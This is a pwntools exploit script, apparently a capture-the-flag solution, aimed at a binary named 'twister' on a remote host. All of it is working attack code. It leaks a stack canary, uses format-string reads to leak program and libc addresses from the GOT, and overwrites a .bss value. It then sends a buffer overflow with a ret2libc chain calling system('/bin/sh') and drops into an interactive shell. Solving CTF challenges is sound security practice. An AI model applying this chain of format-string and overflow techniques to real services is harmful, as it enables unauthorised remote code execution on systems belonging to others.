from pwn import *
import re

elf = context.binary = ELF('./twister')

# Local
#pty = process.PTY
#p = process(stdin=pty, stdout=pty)
#pause()

# Remote
p = remote('3.81.92.37', 4242)
#context.log_level = 'debug'

# And the journey begins...
p.sendline('c')

# Leak canary
p.recvuntil('? (y/n) ')
p.sendline('y')
p.recvuntil('canary_id: ')
canary = int(p.recvline().rstrip(b'\n'))
log.success(f'canary: {canary}')

# Leak baddr
payload = b'AAA%24$p'
p.sendline(payload)

p.recvuntil('AAA')
bss_leak = int(p.recvline().rstrip(b'\n'), 16)
elf.address = baddr_leak = bss_leak - 0x4020
log.success(f'baddr: {hex(baddr_leak)}')

# Leak libc
payload = b'%7$s||||' + p64(elf.got['read'])
p.sendline(payload)
p.recvuntil('input: ')
read_leak = u64(p.recv(6) + b'\x00\x00')

payload = b'%7$s||||' + p64(elf.got['puts'])
p.sendline(payload)
p.recvuntil('input: ')
puts_leak = u64(p.recv(6) + b'\x00\x00')

payload = b'%7$s||||' + p64(elf.got['rand'])
p.sendline(payload)
p.recvuntil('input: ')
rand_leak = u64(p.recv(6) + b'\x00\x00')

log.success(f'read: {hex(read_leak)}, puts: {hex(puts_leak)}, rand: {hex(rand_leak)}')

# Calculate libc
offset_puts = 0x80e50
offset_system = 0x50d70
offset_str_bin_sh = 0x1d8678
offset_pop_rdi = 0x2a3e5

libc_system = puts_leak - offset_puts + offset_system
libc_str_bin_sh = puts_leak - offset_puts + offset_str_bin_sh
libc_pop_rdi = puts_leak - offset_puts + offset_pop_rdi

# Overwrite .bss
target = bss_leak + 0x20 + 0x9C0 + 0x20
payload = fmtstr_payload(6, { target : 1 })
p.sendline(payload)

# Prepare for buffer overflow
p.sendline('n')
p.sendline('p')

# Set up overflow
payload = b'A' * 260 # reach canary
payload += p32(canary) # fill canary
payload += b'B' * 16 # reach rbp

# ret2libc (system)
payload += p64(baddr_leak + 0x101a) # ret
payload += p64(libc_pop_rdi)
payload += p64(libc_str_bin_sh)
payload += p64(libc_system)

p.sendline(payload)

# Finish up
p.sendline('n')

# GGEZ
p.interactive()
